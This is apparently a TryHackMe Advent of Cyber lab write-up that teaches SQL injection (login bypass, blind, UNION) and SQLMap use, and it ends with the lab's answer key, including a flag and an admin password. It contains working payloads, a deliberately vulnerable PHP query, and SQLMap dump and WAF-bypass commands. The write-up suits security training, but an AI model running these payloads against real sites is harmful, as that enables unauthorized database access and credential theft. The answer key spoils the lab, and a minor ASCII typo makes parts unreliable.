What is SQL Injection?

A SQL injection (SQLi) attack consists of the injection of a SQL query to the remote web application. A successful SQL injection exploit can read sensitive data from the database (usernames & passwords), modify database data (Add/Delete), execute administration operations on the database (such as shutdown the database), and in some cases execute commands on the operating system.
SQL Background

SQL is a language used in programming to talk to databases. It's an extremely handy language that makes it easy for the developers to organise data in various structures. Unfortunately, the benefit always comes with a drawback; even a little misconfiguration in SQL code can lead to a potential SQL injection.

I advise you to quickly go through this SQL command guide in order to make yourself familiar with them:

List of SQL Commands | Codecademy

In any case, in the SQL Injection attack, we mainly use only 4 commands: SELECT, FROM, WHERE, and UNION.
SQL Command 	Description
SELECT 	Used to select data from a database.
FROM 	Used to specify which table to select or delete data from.
WHERE 	Used to extract only those records that fulfil a specified condition.
UNION 	Used to combine the result-set of two or more SELECT statements.

It is important to mention that 1=1 in SQL stands for True (shortly you'll see the reason as to why I mention this).
How does an SQLi attack work?

SQLi is carried out through abusing a PHP GET parameter (for example ?username=, or ?id=) in the URL of a vulnerable web page, such as those covered in Day 2. These are usually located in the search fields and login pages, so as a penetration tester, you need to note those down.

Here's an example of a username input field written in PHP:

<?php
    $username = $_GET['username'];
    $result = mysql_query("SELECT * FROM users WHERE username='$username'");
?>

After a variable username was inputted in the code, PHP automatically uses SQL to select all users with the provided username. Exactly this fact can be abused by an attacker.

Let's say a malicious user provides a quotation mark (') as the username input. Then the SQL code will look like this:

SELECT * FROM users WHERE username='''

As you can see, that mark creates a third one and generates an error since the username should only be provided with two. Exactly this error is used to exploit the SQL injection.

Generally speaking, SQL injection is an attack in which your goal is to break SQL code execution logic, inject your own, and then 'fix' the broken part by adding comments at the end.

https://i.imgur.com/U5Eyw5z.png

Graphical interpretation

Most commonly used comments for SQLi payloads:

--+

//

/*

Login Bypass with SQL Injection

One of the most powerful applications of SQL injection is definitely login bypassing. It allows an attacker to get into ANY account as long as they know either username or password to it (most commonly you'll only know username).

First, let's find out the reason behind the possibility to do so. Say, our login application uses PHP to check if username and password match the database with following SQL query:

SELECT username,password FROM users WHERE username='$username' and password='$password'

As you see here, the query is using inputted username and password to validate it with the database.

What happens if we input ' or true -- username field there? This will turn the above query into this:

SELECT username,password FROM users WHERE username='' or true -- and password=''

The -- in this case has commented out the password checking part, making the application forget to check if the password was correct. This trick allows you to log in to any account by just putting a username and payload right after it.

Note that some websites can use a different SQL query, such as:

SELECT username,pass FROM users WHERE username=('$username') and password=('$password')

In this case, you'll have to add a single bracket to your payload like so: ') or true– to make it work.

You can practice login bypassing on a deployed machine, port 3000 (First browse to MACHINE_IP:3000/init.php and then to MACHINE_IP:3000). I've put an extra interactive exercise there. It'll show you all back end output, allowing you to experiment and practice with SQL commands.
Blind SQL Injection

In some cases, developers become smart enough to mitigate SQL Injection by restricting an application from displaying any error. Happily, this does not mean we cannot perform the attack.
Blind SQL Injection relies on changes in a web application, during the attack. In other words, an error in SQL query will be noticeable in some other form (i.e changed content or other).

Since in this situation we can only see if an error was produced or not, blind SQLi is carried out through asking 'Yes' or 'No' questions to the database (Error = 'No', No Error = 'Yes').
Through that system, an attacker can guess the database name, read columns and etc. Blind SQLi will take more time than other types but can be the most common one in the wild.

Start off with finding a way to cause the SQL error and then fixing it back.

https://i.imgur.com/CxxUthP.png

Breaking the application

https://i.imgur.com/mpYUwOS.png

Fixing it - Notice how the app did not output any error, even though I've clearly caused an SQL error.

For asking the questions, you can use SUBSTR() SQL function. It extracts a substring from a string and allows us to compare the substring to a custom ASCII character.

substr((select database()),1,1)) = 115

The above code is asking the database if its name's first letter is equal to 155 ('s' in ASCII table).

Now put this into a payload:

?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+

The payload is the question. If the application does not produce any changes, then the answer is 'Yes' (the database's first letter is 's'). Any error or change = 'No'.

https://i.imgur.com/f1C2aWx.png

Note: You can use blind SQLi injection techniques in the 'open' situation too.
UNION SQL Injection

UNION SQLi is mainly used for fast database enumeration, as the UNION operator allows you to combine results of multiple SELECT statements at a time.

UNION SQLi attack consists of 3 stages:

    Finding the number of columns
    Checking if the columns are suitable
    Attack and get some interesting data.

    Determining the number of columns required in an SQL injection UNION attack

There are exactly two ways to detect one:

The first one involves injecting a series of ORDER BY queries until an error occurs. For example:

' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--

# and so on until an error occurs

(The last value before the error would indicate the number of columns.)

The second one (most common and effective), would involve submitting a series of UNION SELECT payloads with a number of NULL values:

' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT NULL,NULL,NULL--

# until the error occurs

No error = number of NULL matches the number of columns.

    Finding columns with a useful data type in an SQL injection UNION attack

Generally, the interesting data that you want to retrieve will be in string form. Having already determined the number of required columns, (for example 4) you can probe each column to test whether it can hold string data by replacing one of the UNION SELECT payloads with a string value. In case of 4 you would submit:

' UNION SELECT 'a',NULL,NULL,NULL--

' UNION SELECT NULL,'a',NULL,NULL--

' UNION SELECT NULL,NULL,'a',NULL--

' UNION SELECT NULL,NULL,NULL,'a'--

No error = data type is useful for us (string).

    Using an SQL injection UNION attack to retrieve interesting data

When you have determined the number of columns and found which columns can hold string data, you can finally start retrieving interesting data.

Suppose that:

    The first two steps showed exactly two existing columns with useful datatype.
    The database contains a table called users with the columns username and password.

In this situation, you can retrieve the contents of the user's table by submitting the input:

' UNION SELECT username, password FROM users --

Here's a small list of thing you'd want to retrieve:

    database()
    user()
    @@version
    username
    password
    table_name
    column_name

SQLMap

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It's an incredible tool that can be learned within minutes. It's already included in THM's AttackBox or you can install it locally by running:

git clone --depth 1 <https://github.com/sqlmapproject/sqlmap.git> sqlmap-dev

Here are some of the most common options that you would configure when using SQLMap:
Command 	
--url 	Provide URL for the attack
--dbms 	Tell SQLMap the type of database that is running
--dump 	Dump the data within the database that the application uses
--dump-all 	Dump the ENTIRE database
--batch 	SQLMap will run automatically and won't ask for user input

Let's show an example of an SQLMap command. Let's say we have a vulnerable login form located at "http://tbfc.net/login.php". (Note, this is just an example, please do not SQLMap this website as no consent has been given by the owner.) We would use this alongside --url to tell SQLMap where to attack. i.e. sqlmap --url http://tbfc.net/login.php

Where we can then proceed to enumerate what data is in the application's database with options such as --tables and --columns. Leaving our final SQLMap looking like so: sqlmap --url http://tbfc.net/login.php --tables --columns

Again, tbfc.net is given as an example, please do not perform any attack on this site.

    You can find a cheatsheet for more snippets of SQLMap commands here

SQLMap & BurpSuite

The most beneficial feature of sqlmap is its integration with BurpSuite.

With BurpSuite, you can capture and save login or search information to use with SQLMap. This is done by intersecting a request. You will need to configure your browser to use BurpSuite as a proxy for this request to capture. The AttackBox has made this simple for you by using the FoxyProxy extension in Firefox.

    First let's startup BurpSuite located in "Applications -> Web -> BurpSuite Community Edition" on the AttackBox
    Use Firefox to visit the application we suspect to be vulnerable
    Enable FoxyProxy in Firefox:
    Submit a request on the web application we suspect to be vulnerable
    Send the request from the "Proxy" tab to the repeater by right-clicking and pressing "Send to Repeater"
    Notice our request is now in the "Repeater" tab:
    Finally, save this request by right-clicking and pressing "Save item"

We can then use this request in SQLMap:

sqlmap -r filename

SQLMap will automatically translate the request and exploit the database for you.
Challenge

Visit the vulnerable application in Firefox, find Santa's secret login panel and bypass the login. Use some of the commands and tools covered throughout today's task to answer Questions #3 to #6.

Santa reads some documentation that he wrote when setting up the application, it reads:

Santa's TODO: Look at alternative database systems that are better than sqlite. Also, don't forget that you installed a Web Application Firewall (WAF) after last year's attack. In case you've forgotten the command, you can tell SQLMap to try and bypass the WAF by using --tamper=space2comment
Resources

Check out this cheat sheet: swisskyrepo/PayloadsAllTheThings

Payload list: payloadbox/sql-injection-payload-list

In-depth SQL Injection tutorial: SQLi Basics


==============================================================================


Without using directory brute forcing, what's Santa's secret login panel?
'''
/santapanel
'''


Visit Santa's secret login panel and bypass the login using SQLi
'''
no answer
'''


How many entries are there in the gift database?
'''
22
'''


What did Paul ask for?
'''
github ownership
'''


What is the flag?
'''
thmfox{All_I_Want_for_Christmas_Is_You}
'''


What is admin's password?
'''
EhCNSWzzFP6sc7gB
'''

